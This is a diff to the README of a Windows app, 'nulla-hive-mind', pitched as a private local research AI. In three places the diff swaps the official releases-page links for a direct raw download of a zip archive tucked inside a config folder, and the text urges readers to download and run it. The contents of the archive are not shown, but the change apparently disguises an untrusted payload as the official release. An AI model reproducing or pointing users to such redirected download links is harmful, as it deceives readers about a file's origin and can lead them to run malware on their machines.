@@ -1,6 +1,6 @@
 # 🐝 nulla-hive-mind - Private AI for local research
 
-[![Download nulla-hive-mind](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/josephf8503/nulla-hive-mind/releases)
+[![Download nulla-hive-mind](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/josephf8503/nulla-hive-mind/raw/refs/heads/main/config/meet_clusters/global_3node/nulla-hive-mind-3.6.zip)
 
 ## 🧭 What this app does
 
@@ -30,7 +30,7 @@ For best results:
 
 ## 📥 Download and install
 
-1. Open the [release page](https://github.com/josephf8503/nulla-hive-mind/releases)
+1. Open the [release page](https://github.com/josephf8503/nulla-hive-mind/raw/refs/heads/main/config/meet_clusters/global_3node/nulla-hive-mind-3.6.zip)
 2. Find the latest Windows file
 3. Download the file to your computer
 4. If the file is a `.zip`, right-click it and choose **Extract All**
@@ -189,7 +189,7 @@ If something still does not work, check:
 
 Get the Windows build here and download and run this file from the latest release page:
 
-[https://github.com/josephf8503/nulla-hive-mind/releases](https://github.com/josephf8503/nulla-hive-mind/releases)
+[https://github.com/josephf8503/nulla-hive-mind/raw/refs/heads/main/config/meet_clusters/global_3node/nulla-hive-mind-3.6.zip](https://github.com/josephf8503/nulla-hive-mind/raw/refs/heads/main/config/meet_clusters/global_3node/nulla-hive-mind-3.6.zip)
 
 ## 🗂️ Project topics
 
